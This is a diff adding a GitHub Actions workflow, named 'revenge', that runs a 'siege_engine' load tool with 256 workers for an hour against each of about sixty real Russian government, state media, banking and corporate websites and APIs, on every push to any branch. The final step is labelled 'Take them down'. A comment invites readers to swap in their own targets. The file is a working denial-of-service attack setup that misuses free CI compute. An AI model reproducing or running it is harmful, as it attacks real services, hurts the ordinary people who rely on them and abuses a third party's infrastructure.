@@ -1,0 +1,77 @@
+name: revenge
+
+on:
+  push:
+    branches: [ "**" ]
+  pull_request:
+    branches: [ master-origin ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    container: ghcr.io/connorthebro/siege-engine-docker:1.0.1
+    strategy:
+      matrix:
+        # Feel free to change the targets
+        target:
+          - https://www.gosuslugi.ru
+          - https://epp.genproc.gov.ru
+          - https://ach.gov.ru
+          - http://www.scrf.gov.ru
+          - https://mil.ru
+          - https://lenta.ru/
+          - https://ria.ru/
+          - https://ria.ru/lenta/
+          - https://www.rbc.ru/
+          - https://www.rt.com/
+          - http://kremlin.ru/
+          - http://en.kremlin.ru/
+          - https://smotrim.ru/
+          - https://tass.ru/
+          - https://tvzvezda.ru/
+          - https://vsoloviev.ru/
+          - https://www.1tv.ru/
+          - https://www.vesti.ru/
+          - https://online.sberbank.ru/
+          - https://sberbank.ru/
+          - https://zakupki.gov.ru/
+          - https://api.sberbank.ru/prod/tokens/v2/oauth
+          - https://api.sberbank.ru/prod/tokens/v2/oidc
+          - https://api.sberbank.ru
+          - https://ria.ru
+          - https://gazeta.ru
+          - https://kp.ru
+          - https://riafan.ru
+          - https://pikabu.ru
+          - https://kommersant.ru
+          - https://mk.ru
+          - https://yaplakal.com
+          - https://rbc.ru
+          - https://bezformata.com
+          - https://gazprom.com
+          - https://bg14.org
+          - https://government.ru
+          - https://com2com.ru
+          - https://gazprom.com
+          - https://bg14.org
+          - https://ptt.ru
+          - https://moex.com
+          - https://sovam.com
+          - https://rkn.gov.ru
+          - https://sputniknews.com
+          - https://rg.ru
+          - https://lukoil.ru
+          - https://vgtrk.ru
+          - https://gosuslugi.ru
+          - https://uralkali.com
+          - https://rbc.ru
+          - https://kreml.ru
+          - https://russiancouncil.ru
+          - https://relcom.ru
+          - https://tass.ru
+          - https://1tv.ru
+          - https://fmba.gov.ru
+          - https://roe.ru
+    steps:
+      - run: timeout 1h python -m siege_engine 256 ${{ matrix.target }}
+        name: Take them down
